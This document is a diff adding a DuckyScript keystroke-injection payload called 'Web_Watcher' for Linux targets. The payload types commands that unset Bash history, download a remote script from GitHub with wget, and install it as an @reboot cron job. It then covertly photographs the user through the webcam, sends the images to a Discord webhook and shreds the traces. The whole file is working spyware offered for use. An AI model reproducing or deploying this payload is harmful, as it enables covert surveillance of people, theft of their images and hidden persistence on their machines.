@@ -1,0 +1,19 @@
+REM TITLE: Web_Watcher
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Linux (tested on Pop!_Os) 
+REM DESCRIPTION: Web Watcher is a payload that will download a Bash script (.ww.sh) and embed it as a cronjob. The payload will take a picture of the user via the onboard webcam and then exfiltrate the picture to Discord via webhook. The image will then be shredded locally to obfuscate the activity. The script will run 90 seconds after reboot everytime the target machine is started. To work: place Discord webhook on line 6.
+
+DEFINE #Discord_Webhook https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK/HERE
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening temrinal, unsetting Bash history, and download ".ww.sh" Bash script:
+CTRL ALT t
+DELAY 300
+STRINGLN unset HISTFILE; wget https://raw.githubusercontent.com/OSINTI4L/DuckyScript-Payloads/refs/heads/main/Payloads/Web_Watcher/.ww.sh
+DELAY 1200
+
+REM Granting execution permissions to .ww.sh, adding to cron, and exiting:
+STRINGLN chmod +x .ww.sh; sed -i '17s|.*|    #Discord_Webhook|' .ww.sh; crontab -l > wwtemp; echo "@reboot sleep 90 && ~/.ww.sh" >> wwtemp; crontab wwtemp; shred -fuz wwtemp; exit
